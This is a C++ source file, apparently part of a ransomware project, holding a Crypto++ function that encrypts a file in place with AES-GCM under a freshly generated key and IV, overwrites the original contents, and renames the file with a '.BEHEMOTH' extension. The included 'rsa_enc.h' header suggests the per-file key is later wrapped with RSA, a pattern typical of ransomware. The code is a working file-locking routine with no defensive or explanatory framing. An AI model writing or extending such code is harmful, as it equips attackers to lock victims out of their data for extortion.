#include <iostream>
#include <fstream>
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/files.h>
#include <filesystem>

#include "gen_str.h"
#include "rsa_enc.h"
#include "file_enc.h"


bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
{
    using namespace CryptoPP;

    key = gen_str(32);
    iv = gen_str(12);

    try
    {
        GCM<AES>::Encryption encryptor;
        encryptor.SetKeyWithIV(reinterpret_cast<const byte*>(key.data()), key.size(), reinterpret_cast<const byte*>(iv.data()), iv.size());

        std::ifstream inputFile(filePath, std::ios::binary);
        if (!inputFile)
        {
            std::cerr << "Error opening input file" << std::endl;
            return false;
        }

        // Read the input file content
        std::string inputContent((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
        inputFile.close();

        std::ofstream outputFile(filePath, std::ios::binary);
        if (!outputFile)
        {
            std::cerr << "Error opening output file" << std::endl;
            return false;
        }

        StringSource ss(inputContent, true,
            new AuthenticatedEncryptionFilter(encryptor,
                new FileSink(outputFile)
            )
        );

        outputFile.close();
        std::filesystem::rename(filePath, filePath + ".BEHEMOTH");
    }
    catch (const CryptoPP::Exception& e)
    {
        std::cerr << e.what() << std::endl;
        return false;
    }

    return true;
}


